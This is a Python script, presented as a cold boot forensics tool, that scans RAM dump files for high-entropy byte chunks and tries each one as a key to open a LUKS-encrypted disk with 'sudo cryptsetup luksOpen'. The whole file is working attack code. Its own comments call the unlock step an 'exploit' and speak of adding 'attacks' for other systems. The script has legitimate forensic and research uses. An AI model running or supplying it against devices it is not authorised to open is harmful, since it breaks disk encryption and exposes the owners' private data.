#!/usr/bin/env python3
"""
MIT License

Copyright (c) 2025 gjbauer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import math
from collections import Counter
import os
import subprocess
import sys

def try_key(key: bytes, device: str):
	"""Try a given key..."""
	file = "key.bin"
	try:
		with open(file, 'wb') as f:
			f.write(key)
			f.close()
	except IOError as e:
		print(f"Error writing to file '{file}': {e}")
	if sys.platform == "linux":	# TODO: Implement attacks for non-Linux OSes
		print("Attempting Linux exploit...")
		try:	#sudo cryptsetup luksOpen <device_path> <name> --key-file <path/to/keyfile>
			result = subprocess.run(['sudo', 'cryptsetup', 'luksOpen', device, 'hacked', '--key-file', file], capture_output=True, text=True, check=True)
			print("Command output:")
			print(result.stdout)
		except subprocess.CalledProcessError as e:
			print(f"Command failed with error: {e}")
			print(f"Stderr: {e.stderr}")
			sys.exit(1)
	else:
		print("System not supported!! Exiting...")
		sys.exit(1)
			
def scan_memory_dump(file_path: str, device: str, candidates: list = [], chunk_size: int = 32, stride: int = 8):
	"""Scan a memory dump file for cryptographic keys"""
	with open(file_path, 'rb') as f:
		data = f.read()
	
	for i in range(0, len(data) - chunk_size, stride):
		print("{:.2f}".format(100 * (i / (len(data) - chunk_size)))+" % into dump...", end="\r", flush=True)
		chunk = data[i:i + chunk_size]
		
		# Filter 1: Skip known compressed formats
		if is_known_compressed_format(chunk):
			continue
			
		# Filter 2: Minimum entropy threshold
		entropy = calculate_entropy(chunk)
		if entropy < 4.65:
			continue
		
		print("\nPotential key with entropy {:.2f}".format(entropy))
		candidates.append((i, chunk, entropy))
		# Sort by entropy + compression ratio (most promising first)
		candidates.sort(key=lambda x: (x[2]), reverse=True)
		if len(candidates) > 64:
			candidates.pop()  # Remove lowest entropy candidate

def is_known_compressed_format(data: bytes):
	"""Filter for known compressed formats"""
	# GZIP (.gz, .tar.gz)
	if b'\x1f\x8b' in data:  # GZIP
		return True
	# BZIP2 (.bz2, .tar.bz2) 
	if b'BZh' in data:	  # BZIP2
		return True
	# XZ (.xz, .tar.xz)
	if b'\xfd7zXZ\x00' in data:  # XZ
		return True
	# ZIP (.zip, .jar, .docx)
	if b'PK\x03\x04' in data:	# ZIP
		return True
	# 7-Zip (.7z)
	if b'7z\xbc\xaf\x27\x1c' in data:  # 7-Zip
		return True
	# RAR (.rar)
	if b'Rar!\x1a\x07\x00' in data:   # RAR v1.5+
		return True
	if b'Rar!\x1a\x07\x01' in data:   # RAR v5.0
		return True
	
	# Image formats (often compressed)
	if b'\xff\xd8\xff' in data:  # JPEG
		return True
	if b'\x89PNG\r\n\x1a\n' in data:  # PNG
		return True
	if b'GIF8' in data:		  # GIF87a or GIF89a
		return True
	
	# PDF (often contains compressed streams)
	if b'%PDF-' in data:		 # PDF
		return True
	
	# Executable formats (can have compressed sections)
	if b'\x7fELF' in data:	   # ELF binary
		# Could check for UPX-packed executables specifically
		return True
	if b'MZ' in data:			# Windows PE
		return True
	
	return False

def calculate_entropy(data: bytes):
	"""Calculate Shannon Entropy"""
	counts = Counter(data)
	entropy = 0.0
	for count in counts.values():
		prob = count / len(data)
		entropy -= prob * math.log2(prob)
	return entropy

def main():
	if len(sys.argv) < 3:
		usage_msg = """process.py: Cold Boot Data Processing and Encryption Forensics Tool
Copyright (c) 2025 Gabriel Bauer All rights reserved.
Usage:
	python3 process.py /path/to/data-dumps /path/to/encrypted/device"""
		print(usage_msg)
		sys.exit(1)
	candidates = []
	for item in os.listdir(sys.argv[1]):
		item_path = os.path.join(sys.argv[1], item)
		if os.path.isfile(item_path):
			scan_memory_dump(item_path, sys.argv[2], candidates)
	print(candidates)
	# Try top candidates
	for address, key, entropy in candidates:
		print(f"Trying candidate at 0x{address:08x} (entropy: {entropy:.3f})")
		try_key(key, sys.argv[2])

if __name__ == "__main__":
	main()
